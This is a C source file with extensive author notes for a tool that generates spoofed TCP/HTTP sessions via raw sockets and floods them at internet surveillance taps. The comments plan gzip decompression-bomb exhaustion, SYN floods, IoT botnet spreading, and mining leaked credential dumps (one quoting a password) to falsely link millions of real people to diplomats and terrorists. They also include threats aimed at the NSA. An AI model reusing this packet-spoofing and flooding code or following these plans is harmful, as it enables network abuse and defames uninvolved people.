/*
Michael Guidry
11/12/17
This is the actual code related to all attacks I've distributed papers for earlier in 2017.
------



A lot of random notes here from various different moments.. Just skip down to the code below it, or don't think too far
into routines which are either already coded, or changed..

To the NSA: this is for rape.  I think you guys understand just how much damage this will do.
And to think.. this is without resources.  What doo you think will happen in the future?
You people better finish getting rid of everyone now...

11/12 - NSA: you have 3 days to exit my life.. before things get much much worse.

11/10 -
Starting doing some testing/developing on VMware rather than WSL (Ubuntu on Windows 10)
It takes 32~ seconds to do 1million sessions with 10% injections (150k cached between 1-5 injections at 1megabyta GZIP attacak parameters)
2.7 billion in a day from a single (slow) machine...

The same parameters except for the gzip cache reuse being 1500 (instead of 150,000) was 38 seconds. (2.2 billion a day)
The less cache reuse means itll be less probable for these systems to filter the requests out without actually decompressing each.  Its possible
the first measure to filter out is to hash, and quickly determine how many other sessions contain the same hash.

The process will thread for GZIP attacks while pausing the attack structure which initiated it.  I created another thread for dumping
packets to the network.  I'll try to clean things up, and express how to prepare full blown server responses using external scripts,
or applications.  The rest should be fairly simple using the base code.

~2gigabytes for the entire 1million sessions containing 100k GZIP attacks inside of 1million connections (10.3 million packets)

At 100mbit this would take 3 minutes to transfer online.. 1gbps would take 17 seconds, and 10gbps would take 1 second...
It doesn't seem like bandwidth will be a limiting factor here...

Its goiong to get much worse .. this is a building block for something much bigger :)

*/
/*
If you'd like too knnow where to find web server IP addresses then check out censys.  You can get all IPs of HTTP, SSL, etc and even Alexa top 1m.
It would make it a lot simpler than having to check if hosts are up, or down from each node.  It will however increase the original size of the
application's data.  If you are preparing to dump 10million packets per second to the Internet from each node per half minute, then you probably
don't care about the initialization data.. unless this is for a botnet.

*/
/*

Some notes for ISPs:
If you have an ISP which you think the NSA might be somewhere within your network then you could easily perform tasks like this automated
using your spare bandwidth to make the effort of grabbing any actionable intelligence much much harder.  If you have so much bandwidth
in your network available for a certain path.  You could blackhole/unblackhole particular networks, or IP ranges of which aren't used
by your customer base, or using other algorithms thus allowing you to broadcast packets live 24/7 which would get picked up by these
surveillance hacks although wouldn't ever reach the real Internet due to the strategy you've decided for the packets.

It would allow you to take a machine in particular data centers executing these attacks paired with a blackhole controlling mechanism
which would constantly protect your network.  It wouldn't be full protection but it would require exponential increases in
resources to obtain information on your network.


/* this can also be used standalone .. if you select sources, and dest correctly.. you can split up the pcaps by 2 sides
and also set timestamps to future.. and prepare for attacks at particular times

notes on binaray protocols:
the good thing is.. they prob do not accurately represent things like checksums et
so its possible to get text into their databases regardless of everything being 100%
so a libpcap replacing text alone might work well for a lot of them

In other words: if you take a packet capture of MSN messager.. you can probably just overwrite the text, and it should
make it into their databases.  I highly dobut they would be critical of every protocols internal checksum routines for their
packets.  Its an assumption but one I believe is justified by time, and CPU resources..

*/


/*

This application is designed to handle as many different virtual connections, or attacks against
mass surveillance platforms that you can populate with information.  I was able to generate 8300 full HTTP
sessions every second without any real optimizations yet. That's 30 million an hour on a single slow laptop I'm developing
with.  The leaked NSA documents state 40 billion records for 30 days.  If you consider my laptop being able to
handle this many, then what could a small network perform?  How much would it take to disrupt their networks permanently?
Obviously it depends on the information you are inserting.  You could also use compression attacks in the middle of
HTTP TCP/IP sessions to force their machines to have to decompress gigabytes of information using only a few bytes
in each attack session queue.  I don't think these guys have been paying attention to my papers well enough.
If so they would have stopped drugging me, or fucking with my life.  It's too late now.

BTW: I know that you require data to populate these messages, or whatever sites your emulating..
I just found 950 million e-mail addresses in 20 minutes online from hacked & leaked sites.  Those password dumps
are more useful than just for cracking.  You can generate hundreds of millions of fabricated connections between
individuals who have no idea who each other are.   You can also find a list of worldwide government workers on
another site.  The whole point is that whatever the direction may be itll cause a lot of trouble if done on a mass scale.
If you were to link worldwide diplomates to tens of millions of random US citizens then thats some trouble
that wont be easily solved.  I'm not saying you have to do this all in one shot.  It doesn't even have to be the US
surveillance platforms.  It works on every platform which uses the 'illegal fiber tap' methods.  You can also find
lists of terrorists worldwide from the past 30 years, and chain tens of millions of people to them.  These mass
surveillance platforms are vulnerable in design.

--
Leaks from hacked sites: (where i found 950mil email addresses)
https://hacksoc.co.uk/other/dumps
using torrent..
dropbox.. cat *.txt|cut -d: -f1 > dropbox_emails
myspace password: KLub8pT&iU$8oBY(*$NOiu

need to compreess email addresses - find top domains.. and make a list of the users under them and put into a list like that

need UDP support for falsifying DNS, and RTSP (sip vvoice)

CC and BCC are good options because later if they beginn getting better.. itll allow resaons for them to process emails even if it doesnt come from SPF dommains (or domains usually with encrypted email)
SPF can be bypassed pretty easisly due to how thi works but it also means that on some networks it might not go through correctly
--


E-Mail is another story.  Each protocol online which is used by the majority of populations are going to be
fully supported by most governments mass surveillance platforms.  Step 1 of the software is completed.  It
has all building blocks required to advance into other protocols.  I'm talking about populating their databases
with so much false information that they essentially become useless.  CPU/Memory exhaustion to the point to where
it makes no sense to even risk the illegal surveillance to begin with...

*/

/*
Attacking particular things such as chained identities (relationships), etc will require generating sessions of
random names, or IP addresses towards various websites.  It'd be smart to use real sites which are being scooped up
so that you can ensure the attack is worth the packets.  The whole goal is to make these fabricated connections seem
so real that there is no way computationally to separate them.  It decreases the reasoning of supporting the platforms
to begin with.
.. below are random notes throughout development.. it'll give an overall concept, but some things have changed, etc, etc

discovery:
all major sites (prism related, facebook, those kinds) in a list
DNS them all.. and begin to reverse their ranges, and analyze traceroutes to find ones with same hops
to ensure its either in the same datacenter, or closse to it

for DNS it should randomize between google, and other top providers an dthe local provider (it can attempt to DNS fromm all
local hosts as a third of its requests)

generate residential IPs using geoip

generate business IPs using geoip (and a list of worldwide isp providers)

https://www.maxmind.com/en/geoip2-isp-database - $100 for all business ip ranges...
perfect for this.


https://www.maxmind.com/en/geoip2-enterprise-database - even better...
covers all non residential

IANA/whois info could be used (but dont put code to look anything up)

attack:

stage 0-1: IPv6 support... can reuse the same logic structures.. it shouldnt be hard to add...
the main concern iss the IP ranges (harder to scan) but DNS, etc and the same research mechaniss will work
i just dont know if geoip works the same


stsage 1 - syn (not virtual connections) floods using alll of the ranges (but we can virtualize a respoonse from the server
so that it takes up a structure inside of the surveillance platforms)
their first response will be to count a few packets such as 5 before it prioritizes so this should be variable and increase over time
(increase suuch as falsifying more packets per connection as months go on fromm release)

stage 2-  full blown requests using either local network information regarding top sites (non ssl) but with macros being used
to replace information... most used names can be found easily to be integrated for most languages online (top birth names in countries)
and then terrorists, or lists of government employees either captured from www or local network (libpcaap on these routers since its ioT)
could be used to create automatic local lists of macro replacements for the falsifyed connections


stage 3- doing separate sides of the session using multiple hosts across the globe guaranteed to ensure it is son both sides of the tap
this is the LAST possible way that the surveillance platforms can attempt to detect the situations..
and ...its going to be SO CPU intensive, and annoying due to BGP routing and many other factors.. think multicast, anycast,
and just protocol gibberish... yeah.. but itll be prepared anyhow.


s------
at some stage the surveillance systems are going to start randomly accepting connections by some % and only adding them to a permanent
list if they contain actionable intelligence which means that if you declare enough real connections (full sessions) captured and replayed
to autheticate host/ips then it will begin to delegate the falsified ones as well

icmpp messages such as redirect and host not available, ad port not available could also affect these serviecs

-----


    // we set the ts to the time of the last packet submission.. this way the separation is by the messages being completed..
    // this can allow full blown  simulated conversations being pushed directly into intelligence platforms to manipulate them
    // ie: generate text, neural network verify it seems human vs not, then randomly choose whne the two parties would be online together,
    // or not.. it can keep context information about parties (even possibly transmitted over p2p to keep on somme remote server for IoT hacked devices
    // to reload..)
    // this could allow using simulated messages where two parties arent even online at the same time but send small messages...
    // all of this couldd be trained, automated and directed to fconfuse manipulate or disrupt intelligence platforms...
    // thats why this timestamp is extremely impoortant ;)


*/
/*
https://www.privacytools.io/
Global Mass Surveillance - The Fourteen Eyes (https://www.privacytools.io/)
1. Australia 
2. Canada 
3. New Zealand 
4. United Kingdom 
5. United States of America
Nine Eyes
6. Denmark 
7. France 
8. Netherlands 
9. Norway 

Fourteen Eyes
10. Belgium 
11. Germany 
12. Italy 
13. Spain 
14. Sweden

char *fourteen_eyes[] = {"AU","CA","NZ","GB","US","DE","FR","NL","NO","BE","DE","IT","ES","SE",NULL};
geoip [ 

    residential finder - generate & verify IPs within particular countries (first world, high intelligene gathering, etc)

    business IP finders - generate & verify ips in certain industries.. whois/http/dns (dfense, cyber, ads, etc)

    corporate discovery - generate ips for facebook, google, microsoft, etc (all past prism/major online resources, and expected ones now)
    (top few thousands websites should be enough)
]

geoip = 6megs default

posssible to extract top countries out of the database and use solely those.. it should lower it to below a megabyte
and using our own algorithm would help even further



dns (host -t MX, NS, etc) for top sites (to generate enough connections to overrun their capturing scenarios for mail,etc)



traceroute (to ensure it goes through enough hops for the hosts that were generated) which meaans itll pass through the fiber
needss to vereify both sides, source and dest.. then 1 single box can attack and due to rouutinng, bgp and world wide
itll work just as fine as having two boxes working together on other parts of the world

picking hosts near the dest/source host might be smart as well..to ensure it doesnt give away information to these systems
in case they use this tracing scenario to attempt to block or mitigate these attackers


list of protocols
http smtp pop ssl vpn smtp ssh dns (each need to be equally hit to ensure it funnctions for all NSA selectors fromm leaks)

packet generators (lots around)
syn flood, virtual tcp connections (much eaier now that we do not need both sides of the tap)


----
emulation of some packet loss at times may be smart to implement especially over lots of connections (if a score base system
isnt sure then havinng somme situations like this only helps)



*/

#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <getopt.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <fcntl.h>
#include <resolv.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <zlib.h>
#include <pthread.h>
#include <ctype.h>
//#include "structs.h"
//#include <list.h>
//#include "utils.h"
#include "anti_surveillance.h"




#define min(a,b) ((a) < (b) ? (a) : (b))



#define TEST

#ifdef TEST
#include <linux/if_ether.h>
#include <net/ethernet.h>
#endif


// Global Mass Surveillance - The Fourteen Eyes (https://www.privacytools.io/)
char *fourteen_eyes[] = {"AU","CA","NZ","GB","US","DE","FR","NL","NO","BE","DE","IT","ES","SE",NULL};




// generic linked list structure which will always work for any structure type with 'next' as its first element
// you just need to cast to (LINK *<*>)
typedef struct _link { struct _link *next; } LINK;

// count the amount of entries in a linked list
int L_count(LINK *ele) {
    int count = 0;
    
    while (ele != NULL) {
      count++;
      ele = ele->next;
    }
    
    return count;
  }

  
// finds the last element in a linked list
LINK *L_last(LINK *list) {
    if (list == NULL) return NULL;
    while (list->next != NULL) {
      list = list->next;
    }
    
    return list;
}


// Orderd linking (first in first out) which is required for packets
void L_link_ordered(LINK **list, LINK *ele) {
    LINK *_last = NULL;
    
    // if the list has no entries.. then this becomes its first element
    if (*list == NULL) {
      *list = ele;
      return;
    }

    // find the last element
    _last = L_last(*list);
    if (_last == NULL) {
        return;
    }
    // and append this to that one..
    _last->next = ele;
}

  
  
// declarations
unsigned short in_cksum(unsigned short *addr,int len);
void AttackFreeStructures(AS_attacks *aptr);


// no negotiating.
// queue for futher requests to the DNS lookup which will populate IPs for major sites, and corporations
// it should find mail servers, name servers, and other IPs related to these companies which  are different
// from the front facing sites
// it should also allow a spider once these ips are done being used or increase (over months or time) to automatically
// spider the IPs, and reverse then continue adding all ranges/data centers related
// this would allow the software to adapt to how governments will begin to block this attack
// depending on intelligence lost they may attempt to block quickly but id expect it shoud increase by 3-6months
// for spidering all geoip data centers for every major site

// thiis should also lookup residential IPs generated in countries using geoip...
// this information should be cached so the same IoT bot doesnt have to continously look it up
// a system for distributing over p2p could work for this as well but it should verify 10% and immediately
// disqualify p2p if it finds someone is attempting to infect it wiith bad information
// inn that case, they could all scan IPv4 ranges for open DNS servers (simple to do) and then
// share sevveral, or find their own and attempt to get real results

// also it could automaticallly scan and find dns servers in geoip regions to ensure it obtains the correct data centers
// for appllying the attack to that region

enum {
        // can auto append www. to most just to grab that
        DNS_WWW,
        DNS_MX,
        DNS_NS,
        DNS_A,
        DNS_PTR    
};


// queued dns requests (getting prepared to go to wire)
DNSQueue *dns_queue = NULL;

// responsses from DNS requests which can be used for future attacks on particular sites such as facebook, etc
DNSRecord *dns_records = NULL;


// dns (MX, NS, PTR, etc)
//https://stackoverflow.com/questions/1093410/pulling-mx-record-from-dns-server
// ensure it works across all IoT and systems
/*
int DNS_lookup(DNSQueue *qptr) {
    u_char nsbuf[4096];
    char dispbuf[4096];
    ns_msg msg;
    ns_rr rr;
    int i = 0, j = 0, l = 0;

    if (qptr == NULL) return -1;

#ifndef PQUERY
    l = res_query (qptr->hostname, ns_c_any, ns_t_mx, nsbuf, sizeof (nsbuf));
#else
// found this in orig function.. check both...
    res_pquery (&_res, nsbuf, l, stdout);
#endif
    ns_initparse (nsbuf, l, &msg);
    l = ns_msg_count (msg, ns_s_an);
    for (j = 0; j < l; j++) {
        ns_parserr (&msg, ns_s_an, j, &rr);
        ns_sprintrr (&msg, &rr, NULL, NULL, dispbuf, sizeof (dispbuf));
        printf ("%s\n", dispbuf);
    }

    return 1;
}*/


ResearchInfo *research_list = NULL;
AS_attacks *attack_list = NULL;


// The outgoing queue which gets wrote directly to the Internet wire.
AttackOutgoingQueue *network_queue = NULL, *network_queue_last = NULL;
pthread_mutex_t network_queue_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_t network_thread;

// another thread for dumping from queue to the network
void *thread_network_flush(void *arg) {
    int count = 0;
    while (1) {
        pthread_mutex_lock(&network_queue_mutex);

        // how many packets are successful?
        count = FlushAttackOutgoingQueueToNetwork();
        
        pthread_mutex_unlock(&network_queue_mutex);

        // if none.. then lets sleep..  
        if (!count)
            usleep(200);
    }
}

// The raw socket file descriptor for writing the spoofed packets
int raw_socket = 0;

// Open a raw socket and use the global variable to store it
int prepare_socket() {
    int rawsocket = 0;
    int one = 1;
    
    if ((rawsocket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) <= 0)
        return -1;

    if (setsockopt(rawsocket, IPPROTO_IP,IP_HDRINCL, (char *)&one, sizeof(one)) < 0)
        return -1;

    raw_socket = rawsocket;

    return rawsocket;
}


// flushes the attack outgoing queue to the network, and then frees up the lists..
// raw sockets here.. or we could use a writing pcap mode..
// itd be smart to attempt to find a naming scheme, and an instructions file
// so this can be paired with command line tools so things like scp, and ssh can be used
// with a timing mechanism (ntp, or something else which allows correct timing for launching commands)
// so that future pakets can be generated (weeks, days, etc) in advance.. and sent to correct locations
// worldwide to be replayed for particular reasons, or just continous...
// we arent always sure the queues will flush.. so.. we should allow checking, and ensuring some packets can stay in queue
// itd be nice to get them out as quickly as possible since AS_perform() or other commands handle timings
// timings needs to be moved from seconds to milliseconds (for advanced protocol emulation)
int FlushAttackOutgoingQueueToNetwork() {
    int done = 0;
    int count = 0;
    AttackOutgoingQueue *optr = network_queue, *onext = NULL;
    struct sockaddr_in rawsin;

    // we need some raw sockets.
    if (raw_socket <= 0) {
        if (prepare_socket() <= 0) return -1;
    }
    
    while (optr != NULL) {
        // parameters required to write the spoofed packet to the socket.. it ensures the OS fills in the ethernet layer (src/dst mac
        // addresses for the local IP, and local IP's gateway
        rawsin.sin_family       = AF_INET;
        rawsin.sin_port         = optr->dest_port;
        rawsin.sin_addr.s_addr  = optr->dest_ip;
    
        // write the packet to the raw network socket.. keeping track of how many bytes
        int bytes_sent = optr->size;//sendto(raw_socket, optr->buf, optr->size, 0, (struct sockaddr *) &rawsin, sizeof(rawsin));

        // I need to perform some better error checking than just the size..
        if (bytes_sent != optr->size) break;

        // keep track of how many packets.. the calling function will want to keep track
        count++;

        // what comes after? we are about to free the pointer so..
        onext = optr->next;

        // clear buffer
        PtrFree(&optr->buf);

        // free structure..
        free(optr);

        // fix up the linked lists
        if (network_queue == optr)
            network_queue = onext;

        if (network_queue_last == optr)
            network_queue_last = NULL;

        // move to the next link
        optr = onext;
    }

    // return how many successful packets were transmitted
    return count;
}

// Adds a queue to outgoing packet list which is protected by a thread.. try means return if it fails
// This is so we can attempt to add the packet to the outgoing list, and if it would block then we can
// create a thread... if thread fails for some reason (memory, etc) then itll block for its last call here
int AttackQueueAdd(AttackOutgoingQueue *optr, int only_try) {
    int i = 0;

    if (only_try) {
        if (pthread_mutex_trylock(&network_queue_mutex) != 0)
            return 0;
    } else {
        pthread_mutex_lock(&network_queue_mutex);
    }
    
    if (network_queue == NULL) {
        network_queue = network_queue_last = optr;
    } else {
        if (network_queue_last != NULL) {
            network_queue_last->next = optr;
            network_queue_last = optr;
        }
    }

    pthread_mutex_unlock(&network_queue_mutex);

    return 1;
}

// thread for queueing into outgoing attack queue.. just to ensure the software doesnt pause from generation of new sessions
void *AS_queue_threaded(void *arg) {
    AttackOutgoingQueue *optr = (AttackOutgoingQueue *)arg;

    AttackQueueAdd(optr, 0);

    pthread_exit(NULL);
}

// It will move a packet from its PacketInfo (from low level network packet builder) into the
// over all attack structure queue going to the Internet.
int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
    AttackOutgoingQueue *optr = NULL;

    if ((optr = (AttackOutgoingQueue *)calloc(1, sizeof(AttackOutgoingQueue))) == NULL)
        return -1;

    // we move the pointer so its not going to use CPU usage to copy it again...
    // the calling function should release the pointer (set to NULL) so that it doesnt
    // free it too early
    optr->buf = qptr->buf;
    qptr->buf = NULL;

    optr->size = qptr->size;
    qptr->size = 0;

    // required for writing to wire:
    optr->dest_ip = qptr->dest_ip;
    optr->dest_port = qptr->dest_port;

    // Just in case some function later (during flush) will want to know which attack the buffer was generated for
    optr->attack_info = attack;

    // if we try to lock mutex to add the newest queue.. and it fails.. lets try to pthread off..
    if (AttackQueueAdd(optr, 1) == 0) {
        // create a thread to add it to the network outgoing queue.. (brings it from 4minutes to 1minute) using a pthreaded outgoing flusher
        if (pthread_create(&optr->thread, NULL, AS_queue_threaded, (void *)optr) != 0) {
            // if we for some reason cannot pthread (prob memory).. lets do it blocking
            AttackQueueAdd(optr, 0);
        }
    }

    return 1;
}


// Queues a TCP/IP session into a general structure.. the function being passed will be called other code to complete the preparations
// for example: HTTP_Create()
int AS_session_queue(int id, uint32_t src, uint32_t dst, int src_port, int dst_port, int count, int interval, int depth, void *function) {
    AS_attacks *aptr = NULL;

    if ((aptr = (AS_attacks *)calloc(1, sizeof(AS_attacks))) == NULL)
        return 0;

    // identifier for the attack..in case we need to find it in queue later
    aptr->id = id;

    // src&dst information
    aptr->src = src;
    aptr->dst = dst;
    aptr->source_port = src_port;
    aptr->destination_port = dst_port;

    // this is a full blown tcp session
    aptr->type = ATTACK_SESSION;

    // how many times will we replay this session?
    aptr->count = count;
    // how much time in seconds between each replay?
    aptr->repeat_interval = interval;

    // what function will be used to generate this sessions parameters? (ie: HTTP_Create())
    aptr->function = function;

    // initialize a mutex for this structure
    //aptr->pause_mutex = PTHREAD_MUTEX_INITIALIZER;
    pthread_mutex_init(&aptr->pause_mutex, NULL);

    // LIFO i decided it doesnt matter since the attacks are all happening simultaneously...
    // if it becomes a problem its a small fix.  but your queues should also flush properly anyhow..
    aptr->next = attack_list;
    attack_list = aptr;

    return 1;
}

// pause by pointer, or identifier
int AS_pause(AS_attacks *attack, int id, int resume) {
    AS_attacks *aptr = attack;

    // try to find by id if the calling function didnt pass an id
    if (attack == NULL && id) {
        // enumerate through attack queue looking for this ID
        aptr = attack_list;
        while (aptr != NULL) {
            if (aptr->id == id) break;

            aptr = aptr->next;
        }
    }

    // couldnt find the attack queue
    if (aptr == NULL) {
        return -1;
    }

    pthread_mutex_lock(&aptr->pause_mutex);

    // if so.. its not being used for anotheer pthread...    
    aptr->paused = resume ? 0 : 1;

    pthread_mutex_unlock(&aptr->pause_mutex);

    return 1;
}


// We wouldn't want the surveillance platforms to see the same exact packets.. over and over..
// Let's adjust the source port, identifiers, ACK/SEQ bases, etc here..
// This function will have to call other functions soon to modify MACROS. (dynamic portions of the packets
// which are intended to show other differences..) It could even load other messages in some cases.
// it depends on how your attacks are targeted.
void PacketAdjustments(AS_attacks *aptr) {
    // our new source port must be above 1024 and below 65536
    // lets get this correct for each emulated operating system later as well
    int client_port = (1024 + rand()%(65535 - 1024));
    int client_identifier = rand()%0xFFFFFFFF;
    int server_identifier = rand()%0xFFFFFFFF;
    
    int client_new_seq = rand()%0xFFFFFFFF;
    int server_new_seq = rand()%0xFFFFFFFF;

    uint32_t src_ip = rand()%0xFFFFFFFF;
    uint32_t dst_ip = rand()%0xFFFFFFFF;

    uint32_t client_seq_diff = 0;
    uint32_t server_seq_diff = 0;

    PacketBuildInstructions *buildptr = aptr->packet_build_instructions;

    while (buildptr != NULL) {
        // set ports for correct side of the packet..
        if (buildptr->client) {

            buildptr->source_ip = src_ip;
            buildptr->destination_ip = dst_ip;

            // Source port from client side to server is changed here
            buildptr->source_port = client_port;
            // The header identifier is changed here (and we are using the client side)
            buildptr->header_identifier = client_identifier++;

            // replace tcp/ip ack/seq w new base
            client_seq_diff = buildptr->seq - aptr->client_base_seq;
            buildptr->seq = client_new_seq + client_seq_diff;

            if (buildptr->ack != 0) {
                server_seq_diff = buildptr->ack - aptr->server_base_seq;
                buildptr->ack = server_new_seq + server_seq_diff;
            }

        } else  {

            buildptr->source_ip = dst_ip;
            buildptr->destination_ip = src_ip;
            
            // Source port from server to client is changed here
            buildptr->destination_port = client_port;
            // The header identifier is changed here (and we use the server side)
            buildptr->header_identifier = server_identifier++;

            server_seq_diff = buildptr->seq - aptr->server_base_seq;
            buildptr->seq = server_new_seq + server_seq_diff;

            if (buildptr->ack != 0) {
                client_seq_diff = buildptr->ack - aptr->client_base_seq;
                buildptr->ack = client_new_seq + client_seq_diff;
            }
        }

        // do we modify the data? lets try.. changes hashes.. uses more resources
        if (buildptr->data && buildptr->data_size) {
            HTTPContentModification(buildptr->data, buildptr->data_size);
        }

        // move to the next packet
        buildptr = buildptr->next;
    }

    // make sure we update the attack structure for next ACK/SEQ adjustment
    aptr->client_base_seq = client_new_seq;
    aptr->server_base_seq = server_new_seq;

    // Rebuild all packets using the modified instructions
    BuildTCP4Packets(aptr);

    return;
}

//https://www.linuxquestions.org/questions/programming-9/how-to-calculate-time-difference-in-milliseconds-in-c-c-711096/
int timeval_subtract (struct timeval *result, struct timeval  *x, struct timeval  *y) {
    if (x->tv_usec < y->tv_usec) {
        int nsec = (y->tv_usec - x->tv_usec) / 1000000 + 1;

        y->tv_usec -= 1000000 * nsec;
        y->tv_sec += nsec;
    }

    if (x->tv_usec - y->tv_usec > 1000000) {
        int nsec = (y->tv_usec - x->tv_usec) / 1000000;

        y->tv_usec += 1000000 * nsec;
        y->tv_sec -= nsec;
    }

    result->tv_sec = x->tv_sec - y->tv_sec;
    result->tv_usec = x->tv_usec - y->tv_usec;

    return x->tv_sec < y->tv_sec;
}

// This is one of the main logic functions.  It handles sessions which are to be replayed many times, along with the timing 
// logic, and it calls other functions to queue into the network outgoing queue
void PacketQueue(AS_attacks *aptr) {
    int ts = 0;
    PacketInfo *pkt = NULL;
    struct timeval tv;
    struct timeval time_diff;

    gettimeofday(&tv, NULL);

    // if this thread is paused waiting for some other thread, or process to complete a task
    if (aptr->paused == 1) return;

    // if its already finished.. lets just move forward
    if (aptr->completed) return;

    // onoe of these two cases are correct fromm the calling function
    if (aptr->current_packet != NULL)
        pkt = aptr->current_packet;
    else {
        // we do have to reprocess these packets fromm packet #1?
        if (aptr->count == 0) {
            // Free all packets (it will put a NULL at its pointer location afterwards)
            PacketsFree(&aptr->packets);

            // If there was anything in current_packet then its freed already from the function above
            aptr->current_packet = NULL;
            
            aptr->completed = 1;

            return;
        }

        // lets start it over..
        pkt = aptr->packets;        
    }

    if (pkt == NULL) {
        // error shouldnt be here...
        aptr->completed = 1;

        return;
    }

    // is it the first packet?
    if (pkt == aptr->packets) {
        // if we are about to replay this attack again from the first packet due to a repeat count.. then
        // verify enough time has elapsed to match our repeat interval (IN seconds)
        timeval_subtract(&time_diff, &aptr->ts, &tv);
        if (time_diff.tv_usec < aptr->repeat_interval) {
            // we are on the first packet and it has NOT been long enough...
            return;
        }

        // derement the count..
        aptr->count--;

        // aptr->ts is only set if it was already used once..
        if (aptr->ts.tv_sec) {

            // free older packets since we will rebuild
            PacketsFree(&aptr->packets);
            // we wanna start fresh..
            aptr->current_packet = NULL;

            // we have some adjustments to make (source port, identifiers, etc)
            PacketAdjustments(aptr);

            // we must refresh this pointer after that..
            pkt = aptr->packets;
        }

        // If its marked as completed for any reason, then we are done.
        if (aptr->completed) return;
    } else {
        // Is it too soon to send this packet? (we check its milliseconds)
        timeval_subtract(&time_diff, &aptr->ts, &tv);

        if (time_diff.tv_usec < pkt->wait_time) {
            return;
        } 
    }

    // Queue this packet into the outgoing queue for the network wire
    AS_queue(aptr, pkt);

    // We set this pointer to the next packet for next iteration of AS_perform()
    aptr->current_packet = pkt->next;

    gettimeofday(&aptr->ts, NULL);

    return;
}


// free all packets within an attack structure
void PacketsFree(PacketInfo **packets) {
    PacketInfo *ptr = NULL, *pnext = NULL;

    if (packets == NULL) return;

    ptr = *packets;

    // verify there are packets there to begin with
    if (ptr == NULL) return;

    // free all packets
    while (ptr != NULL) {
        // once AS_queue() executes on this.. it moves the pointer over
        // so it wont need to be freed from here (itll happen when outgoing buffer flushes)
        PtrFree(&ptr->buf);

        // keep track of the next, then free the current..
        pnext = ptr->next;

        // free this specific structure element
        free(ptr);

        // now use that pointer to move forward..
        ptr = pnext;
    }

    // no more packets left... so lets ensure it doesn't get double freed
    *packets = NULL;

    return;
}

// If a session has been deemed completed, then this function will remove it and fix up the linked lists
void AS_remove_completed() {
    AS_attacks *aptr = attack_list, *anext = NULL, *alast = NULL;

    while (aptr != NULL) {
        if (pthread_mutex_trylock(&aptr->pause_mutex) == 0) {

            if (aptr->completed == 1) {
                // try to lock this mutex
                
                    // we arent using a normal for loop because
                    // it'd have an issue with ->next after free
                    anext = aptr->next;

                    // free all packets from this attack structure..
                    AttackFreeStructures(aptr);

                    if (attack_list == aptr)
                        attack_list = anext;
                    else {
                        alast->next = anext;
                    }

                    pthread_mutex_unlock(&aptr->pause_mutex);
                    
                    // free the structure itself
                    free(aptr);

                    aptr = anext;

                    continue;
                }

                pthread_mutex_unlock(&aptr->pause_mutex);
            }

        alast = aptr;

        aptr = aptr->next;
    }

    return;
}


// Perform one iteration of each attack structure that was queued
int AS_perform() {
    AS_attacks *aptr = attack_list;
    attack_func func;
    int r = 0;
    
    while (aptr != NULL) {
        // try to lock this mutex
        if (pthread_mutex_trylock(&aptr->pause_mutex) == 0) {  
            
            // if we need to join this thread (just in case pthread will leak otherwise)
            if (aptr->join) {
                pthread_join(aptr->thread, NULL);
                aptr->join = 0;
            }
            
            //printf("aptr %p next %p\n", aptr, aptr->next);
            if (aptr->paused == 0 && aptr->completed == 0) {
                r = 0;
                // if we dont have any prepared packets.. lets run the function for this attack
                if (aptr->packets == NULL) {
                    // call the correct function for performing this attack to build packets.. it could be the first, or some adoption function decided to clear the packets
                    // to call the function again
                    func = (attack_func)aptr->function;
                    if (func != NULL) {
                        // r = 1 if we created a new thread
                        r = ((*func)(aptr) == NULL) ? 0 : 1;
                    }
                }

                if (!r && !aptr->paused) {
                    // If those function were successful then we would have some packets here to queue..
                    if ((aptr->current_packet != NULL) || (aptr->packets != NULL)) {
                        PacketQueue(aptr);
                    } else {
                        // otherwise we mark as completed to just free the structure
                        aptr->completed = 1;
                    }
                }
            }

            pthread_mutex_unlock(&aptr->pause_mutex);
        }

        // go to the next
        aptr = aptr->next;
    }

    // every loop lets remove completed sessions... we could choose to perform this every X iterations, or seconds
    // to increase speed at times.. depending on queue, etc
    AS_remove_completed();

#ifndef TEST
    // flush network packets queued to wire
    FlushAttackOutgoingQueueToNetwork();
#endif

    return 1;
}

// free a pointer after verifying it even exists
void PtrFree(char **ptr) {
    if (ptr == NULL) return;
    if (*ptr == NULL) return;
    
    free(*ptr);
    *ptr = NULL;
}

// clean up the structures used to keep information requira ed for building the low level network packets
void PacketBuildInstructionsFree(PacketBuildInstructions **list) {
    
    PacketBuildInstructions *iptr = *list, *inext = NULL;

    while (iptr != NULL) {
        PtrFree(&iptr->data);
        iptr->data_size = 0;

        PtrFree(&iptr->packet);
        iptr->packet_size = 0;

        PtrFree(&iptr->options);
        iptr->options_size = 0;

        // what comes after this?
        inext = iptr->next;

        // free this structure..
        free(iptr);

        // move to the next..
        iptr = inext;
    }

    // they were all cleared so we can ensure the linked list is empty.
    *list = NULL;

    return;
}

// frees all extra information being stored in an attack structure
void AttackFreeStructures(AS_attacks *aptr) {
    // free build instructions
    PacketBuildInstructionsFree(&aptr->packet_build_instructions);

    // free packets already prepared in final outgoing structure for AS_queue()
    PacketsFree(&aptr->packets);

    if (aptr->extra_attack_parameters) PtrFree((char **)&aptr->extra_attack_parameters);
}


// This function takes the linked list of build instructions, and loops to build out each packet
// preparing it to be wrote to the Internet.
void BuildTCP4Packets(AS_attacks *aptr) {
    int bad = 0;
    PacketBuildInstructions *ptr = aptr->packet_build_instructions;
    PacketInfo *qptr = NULL;

    if (ptr == NULL) {
        aptr->completed = 1;
        return;
    }

    while (ptr != NULL) {
        // Build the options, single packet, and verify it worked out alright.
        if ((PacketTCP4BuildOptions(aptr, ptr) != 1) || (BuildSingleTCP4Packet(ptr) != 1) ||
                 (ptr->packet == NULL) || (ptr->packet_size <= 0)) {
            // Mark for deletion otherwise
            aptr->completed = 1;

            return;
        }

        // everything went well...
        ptr->ok = 1;

        ptr = ptr->next;
    }

    // All packets were successful.. lets move them to a different PacketInfo structure..
    // PacketInfo is the structure used to put into the outgoing network buffer..
    // this mightt be possible to remove.. but i wanted to give some room for additional
    // protocols later.. so i decided to keep for now...
    ptr = aptr->packet_build_instructions;

    while (ptr != NULL) {
